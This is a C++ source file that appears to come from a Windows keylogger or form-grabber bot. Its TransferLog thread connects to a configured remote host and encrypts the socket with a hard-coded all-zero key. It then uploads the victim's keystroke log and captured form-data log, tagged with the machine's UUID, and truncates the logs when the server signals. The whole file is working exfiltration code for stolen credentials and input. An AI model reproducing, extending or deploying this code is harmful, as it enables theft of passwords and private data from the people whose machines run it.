#include <winsock2.h>
#include "transferlog.h"

TransferLog::TransferLog(UINT Flags, PCHAR Host, USHORT Port){
	TransferLog::Flags = Flags;
	TransferLog::Host = new CHAR[strlen(Host) + 1];
	strcpy(TransferLog::Host, Host);
	TransferLog::Port = Port;
	StartThread();
}

TransferLog::~TransferLog(){
	delete[] Host;
}

VOID TransferLog::ThreadFunc(VOID){
	Socket Socket;
	Socket.Create(SOCK_STREAM);
	UINT CurrentLog = 0;
	BOOL SentHeader = FALSE;
	INT Connected = FALSE;
	DWORD FileSize = 0;
	DWORD TotalRead = 0;
	DWORD OldTotalRead = 0;
	File LogFile;
	Timeout Timeout;
	while(1){
		if(!Connected){
			if(Socket.Connect(Host, Port) == ERROR_SUCCESS){
				#ifdef _DEBUG
				dprintf("** LOG Connected\r\n");
				#endif
				UCHAR Key[32];
				memset(Key, 0, sizeof(Key));
				CFB CFB;
				CFB.SetKey(Key, 32);
				Socket.Crypt(CFB);
				Connected = TRUE;
				Socket.BlockingMode(BLOCKING);
			}else{
				#ifdef _DEBUG
				dprintf("** LOG Could not connected\r\n");
				#endif
				Socket.Disconnect(CLOSE_BOTH_HDL);
				return;
			}
		}
		if(Connected){
			WSAEVENT hEvent = Socket.GetEventHandle();
			if(WSAWaitForMultipleEvents(1, &hEvent, FALSE, Connected == 2 ? INFINITE : 0, FALSE) != WSA_WAIT_TIMEOUT){
				WSANETWORKEVENTS NetEvents;
				Socket.EnumEvents(&NetEvents);
				if(NetEvents.lNetworkEvents & FD_CLOSE || Timeout.TimedOut()){
					Socket.Disconnect(CLOSE_BOTH_HDL);
					return;
				}
			}
			if(!SentHeader){
				do{
					CurrentLog++;
					switch(CurrentLog){
						case 1: if(Flags & TRANSFER_KEYLOG) {LogFile.Open(Config::GetKeylogFilename()); SentHeader = TRUE;} break;
						case 2: if(Flags & TRANSFER_FORMLOG) {LogFile.Open(Config::GetFormlogFilename()); SentHeader = TRUE;} break;
						default: Socket.EventSelect(FD_CLOSE); Socket.Shutdown(); Connected = 2; Timeout.SetTimeout(SHUTDOWN_TIMEOUT); Timeout.Reset(); break;
					}
				}while(!SentHeader && Connected != 2);
				if(Connected != 2){
					FileSize = LogFile.GetSize();
					TotalRead = 0;
					Socket.Sendf("%s:%u:%d\r\n", Config::GetUUIDAscii(), FileSize, Flags);
				}
			}
			if(Connected != 2){
				BYTE ReadBuf[1024];
				DWORD BytesRead;
				LogFile.Read(ReadBuf, sizeof(ReadBuf), &BytesRead);
				if(BytesRead == 0 || TotalRead >= FileSize){
					#ifdef _DEBUG
					dprintf("** LOG Done sending file\r\n");
					#endif
					SentHeader = FALSE;
					CHAR Buffer[1];
					Socket.Recv(Buffer, 1);
					if(Buffer[0] == '1'){ // Truncate
						CHAR TempName[MAX_PATH];
						FILE* TempFile = fopen(tmpnam(TempName), "w+D");
						LogFile.SetPointer(FILE_BEGIN, FileSize);
						do{
							LogFile.Read(ReadBuf, sizeof(ReadBuf), &BytesRead);
							if(BytesRead > 0)
								fwrite(ReadBuf, 1, BytesRead, TempFile);
						}while(BytesRead > 0);
						LogFile.SetPointer(FILE_BEGIN, 0);
						LogFile.SetEOF();
						while((BytesRead = fread(ReadBuf, 1, sizeof(ReadBuf), TempFile)))
							LogFile.Write(ReadBuf, BytesRead);
						LogFile.Close();
						fclose(TempFile);
					}else
						LogFile.Close();
				}else{
					OldTotalRead = TotalRead;
					TotalRead += BytesRead;
					if(TotalRead > FileSize)
						BytesRead = FileSize - OldTotalRead;
					Socket.Send((PCHAR)ReadBuf, BytesRead);
				}
			}
		}
	}
}